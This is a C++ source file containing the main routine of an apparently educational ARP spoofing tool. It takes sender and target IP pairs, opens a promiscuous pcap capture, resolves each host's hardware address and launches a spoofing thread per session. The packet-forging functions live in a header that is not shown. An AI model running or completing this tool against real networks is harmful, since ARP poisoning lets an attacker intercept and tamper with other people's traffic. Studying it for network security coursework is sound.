#include "ty_network.h"


using namespace std;


int main(int argc, char* argv[]) {
	my_assert(argc >= 4 && argc % 2 == 0, "syntax: ./%s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n", argv[0]);

	const char *interface = argv[1];

	struct in_addr 		attack_ip;
	struct ether_addr	attack_ha;

	int session_num = argc / 2 - 1;

	vector<struct session_data>	Session_data(session_num);


	printf("- Interface: %s\n",interface);

	for(int i = 0; i < session_num; i++){
		my_assert( inet_pton(AF_INET, argv[i * 2 + 2], &Session_data[i].SenderIP) > 0, "Invalid sender_ip%d(%s) Or Error On Copying IP", i + 1, argv[i * 2 + 2]);
		my_assert( inet_pton(AF_INET, argv[i * 2 + 3], &Session_data[i].TargetIP) > 0, "Invalid target_ip%d(%s) Or Error On Copying IP", i + 1, argv[i * 2 + 3]);
	}

	my_assert( GetLocalIP(&attack_ip, interface), "Error On Getting Local IP Address\n");
	printf("- Local_IP: %s\n", inet_ntoa(attack_ip));
	my_assert( GetLocalHA(&attack_ha, interface), "Error On Getting Local Hardware Address\n");
	printf("- Local_HA: %s\n", usr_ether_ntoa(&attack_ha));

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	my_assert( (handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf)) != NULL, "couldn't open device %s: %s\n", interface, errbuf);

	for(int i = 0; i < session_num; i++){
		Session_data[i].AttackIP = attack_ip;
		Session_data[i].AttackHA = attack_ha;
		printf("-----session %d-----\n",i + 1);
		printf("- Sender_IP%d: %s\n",i + 1, inet_ntoa(Session_data[i].SenderIP));
		my_assert( GetHA(handle, &attack_ha, &attack_ip, &Session_data[i].SenderHA, &Session_data[i].SenderIP), "Error On Getting sender%d(%s) Hardware Address\n", i + 1, argv[i * 2 + 2]);
		printf("- Sender_HA%d: %s\n",i + 1, usr_ether_ntoa(&Session_data[i].SenderHA));

		printf("- Target_IP%d: %s\n",i + 1, inet_ntoa(Session_data[i].TargetIP));
		my_assert( GetHA(handle, &attack_ha, &attack_ip, &Session_data[i].TargetHA, &Session_data[i].TargetIP), "Error On Getting target%d(%s) Hardware Address\n", i + 1, argv[i * 2 + 3]);
		printf("- Target_HA%d: %s\n",i + 1, usr_ether_ntoa(&Session_data[i].TargetHA));
	}

	printf("\n----Start ArpSpoof----\n");

	vector<thread> Session_thread;
	for(int i = 0; i < session_num; i++){
		Session_thread.push_back( thread(ArpSpoof, interface, &Session_data[i]));
	}
	while(1){
		session_data::mtx_status.lock();
		if(session_data::status == session_num) break;
		session_data::mtx_status.unlock();
		sleep(0);
	}

	printf("press enter for end\n");
	getchar();

	session_data::status = -1;

	for(int i = 0; i < session_num; i++){
		Session_thread[i].join();
	}



	return 0;
}
